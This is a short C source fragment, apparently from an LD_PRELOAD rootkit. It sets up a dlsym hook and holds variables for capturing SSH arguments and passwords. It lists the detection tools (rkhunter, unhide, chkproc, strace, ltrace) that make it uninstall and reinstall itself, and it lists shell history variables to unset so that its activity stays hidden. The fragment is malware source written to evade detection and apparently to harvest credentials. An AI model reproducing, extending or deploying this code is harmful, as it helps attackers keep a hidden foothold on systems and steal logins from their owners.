#include "hooks/prototypes.h"
#define HOOK(func,sym) if(!func) func=dlsym(RTLD_NEXT,sym);
static int pid, have_ponged, sockfd, ssh_start, ssh_pass_size;
char *prefix, *username, *command, *largument, ssh_args[512], ssh_pass[512];

/* when these bins are being run: */
static char *bad_bins[1]={"netstat"}; /* kill all rootkit processes */
static char *hprocs[8]={"lsrootkit","ldd","unhide","rkhunter","chkproc","chkdirs","ltrace","strace"}; /* uninstall & reinstall self */

static char *const nargv[3]={"/usr/bin/cat","/dev/null",NULL};
static const char *usetenvs[4]={"HISTFILE","SAVEHIST","TMOUT","PROMPT_COMMAND"}; /* unset these variables if rootkit process */

void commit_termicide(void)
{
    shutdown(sockfd,SHUT_RDWR);
    close(sockfd);
}